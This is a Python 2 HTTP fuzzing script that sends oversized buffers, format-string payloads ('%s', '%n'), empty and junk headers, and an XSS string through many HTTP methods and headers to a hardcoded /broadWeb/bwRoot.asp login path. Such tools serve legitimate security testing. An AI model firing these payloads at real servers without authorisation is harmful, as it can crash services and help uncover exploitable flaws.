#!/usr/bin/python
import sys, os
import httplib
import time
import re

methods = ["ACL","BASELINE-CONTROL","BCOPY","BDELETE","BMOVE","BPROPFIND",
            "BPROPPATCH","CHECKIN","CHECKOUT","CONNECT","COPY","DEBUG",
            "DELETE","GET","HEAD","INDEX","LABEL","LOCK","MERGE",
            "MKACTIVITY","MKCOL","MKWORKSPACE","MOVE","NOTIFY","OPTIONS",
            "ORDERPATCH","PATCH","POLL","POST","PROPFIND","PROPPATCH","PUT",
            "REPORT","RPC_IN_DATA","RPC_OUT_DATA","SEARCH","SUBSCRIBE",
            "UNCHECKOUT","UNLOCK","UNSUBSCRIBE","UPDATE","VERSION-CONTROL",
            "X-MS-ENUMATTS"]
request_headers = ["Accept","Accept-Charset","Accept-Encoding",
        "Accept-Language","Accept-Datetime","Authorization","Content-Encoding",
        "Cache-Control","Connection","Cookie","Content-Length","Content-MD5",
        "Content-Type","Date","Expect","From","Host","If-Match",
        "If-Modified-Since","If-None-Match","If-Range","If-Unmodified-Since",
        "Max-Forwards","Origin","Pragma","Proxy-Authorization","Range",
        "Referer","TE","Trailer","Transfer-Encoding","Upgrade","User-Agent",
        "Via","Warning","X-Forwarded-For","X-Forwarded-Host",
        "X-Forwarded-Proto","X-HTTP-Method-Override","X-Csrf-Token"]
static_headers = {
                "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:36.0) Gecko/20100101 Firefox/36.0",
                "Content-Length": "0",
                "Connection": "keep-alive",
                "Keep-Alive": "115"}

jbuff = "A"*5000
fbuffs = "%s"*2500
fbuffn = "%n"*2500

def usage(argv):
    print "Usage:\n\t%s [m:h:a] webserver_ip webserver_port" %(argv[0])
    print "\t-m\tFuzz Methods only"
    print "\t-h\tFuzz Headers only"
    print "\t-a\tFuzz Methods and Headers"
    print "e.g.\n\t%s -a 1.1.1.1 80" %argv[0]
    sys.exit()

def sreq_gresp(hconn_handler, method, uri):
    global static_headers
    data = "Praveen Darshanam's HTTP Server Fuzzer"
    print "Headers used in the request:"
    for k,v in static_headers.items():
        print "\t" + str(k)
    if method == "POST" or method == "PUT":
        static_headers.update({"Content-Length": len(data)})
        hconn_handler.request(method, uri, data, static_headers)
    else:
        hconn_handler.request(method, uri, None, static_headers)

    resp = hconn_handler.getresponse()
    if str(resp.status) != "200":
        print "Response Code and Status:"
        print (resp.status, resp.reason)
    resp_data = resp.read()
    print "Length of Server Response %d" %len(resp_data)
    print "Sleeping for a sec to get proper Capture"
    rex = re.compile('<script')
    if resp_data:
        match = rex.match(resp_data)
        if match:
            print "<script> tag in response"
            print resp_data
        else:
            print "XSS string not found in response"

    time.sleep(1)
    hconn_handler.close()
    print "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+"

def fuzz_methods(hconn_handler, args):
    global static_headers
    #handle CONNECT method
    print "Fuzzing %d Methods" %len(methods)
    for method in methods:
        print "Fuzzing Method: " + method
        print "Malicious Data: huge buffer"
        sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin"+jbuff)
        print "Fuzzing Method: " + method
        print "Malicious Data: huge format string(%s)"
        sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin"+fbuffs)
        print "Fuzzing Method: " + method
        print "Malicious Data: huge format string(%n)"
        sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin"+fbuffn)
    print "Test for Invalid method with huge buffer"
    sreq_gresp(hconn_handler, jbuff, "/broadWeb/bwRoot.asp?username=admin")
    print "Test for Invalid method with huge format string(%s)"
    sreq_gresp(hconn_handler, fbuffs, "/broadWeb/bwRoot.asp?username=admin")
    print "Test for Invalid method with huge format string(%s)"
    sreq_gresp(hconn_handler, fbuffn, "/broadWeb/bwRoot.asp?username=admin")

def fuzz_headers(hconn_handler, args):
    global static_headers
    print "Fuzzing %d Headers" %len(request_headers)
    print "Before update: Fuzzing %d Headers" %len(static_headers)
    for method in methods:
        for header in request_headers:
            print "Fuzzing Method: " + method
            print "Header: " + header
            print "Malicious Data: huge buffer"
            static_headers.update({header: jbuff})
            print "after update: Fuzzing %d Headers" %len(static_headers)
            # send request, get response
            sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin")
            del static_headers[header]

            print "Fuzzing Method: " + method
            print "Header: " + header
            print "Malicious Data: huge format string(%s)"
            static_headers.update({header: fbuffs})
            print "after update: Fuzzing %d Headers" %len(static_headers)
            # send request, get response
            sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin")
            del static_headers[header]

            print "Fuzzing Method: " + method
            print "Header: " + header
            print "Malicious Data: huge format string(%n)"
            static_headers.update({header: fbuffn})
            print "after update: Fuzzing %d Headers" %len(static_headers)
            # send request, get response
            sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin")
            del static_headers[header]
 
            print "Fuzzing Method: " + method
            print "Header: " + header
            print "Malicious Data: Empty Header"
            static_headers.update({header: ""})
            print "after update: Fuzzing %d Headers" %len(static_headers)
            # send request, get response
            sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin")
            del static_headers[header]

            print "Fuzzing Method: " + method
            print "Header: " + header
            print "Malicious Data: XSS string"
            static_headers.update({header: "<script>alert(\"XSS\")</script>"})
            print "after update: Fuzzing %d Headers" %len(static_headers)
            # send request, get response
            sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin")
            del static_headers[header]

            print "Fuzzing Method: " + method
            print "Header: " + header
            print "Malicious Data: Header+ junk data"
            static_headers.update({header+jbuff: jbuff})
            print "after update: Fuzzing %d Headers" %len(static_headers)
            # send request, get response
            sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin")
            del static_headers[header+jbuff]

            print "Fuzzing Method: " + method
            print "Header: " + header
            print "Malicious Data: Header+format string(%n)"
            static_headers.update({header+fbuffn: fbuffn})
            print "after update: Fuzzing %d Headers" %len(static_headers)
            # send request, get response
            sreq_gresp(hconn_handler, method, "/broadWeb/bwRoot.asp?username=admin")
            del static_headers[header+fbuffn]

def fuzz_everything(hconn_handler, args):
    global static_headers
    print "Fuzzing all Methods(%d) and Headers(%d)" %(len(methods), len(request_headers))
    fuzz_methods(hconn_handler, args)
    fuzz_headers(hconn_handler, args)
 
def main(argv):
    global static_headers
    if len(argv) !=4:
        usage(argv)
    print " variable type:" + str(type(argv))    

    #create handler
    httpconn = httplib.HTTPConnection(argv[2])    

    static_headers.update({"Host": argv[2]})
    if argv[1] == "-m":
        fuzz_methods(httpconn,argv)
    elif argv[1] == "-h":
        fuzz_headers(httpconn,argv)
    elif argv[1] == "-a":
        fuzz_everything(httpconn,argv)
    else:
        print "\nInvalid method/header argument"
        usage(argv)     


if __name__ == "__main__":
    main(sys.argv)
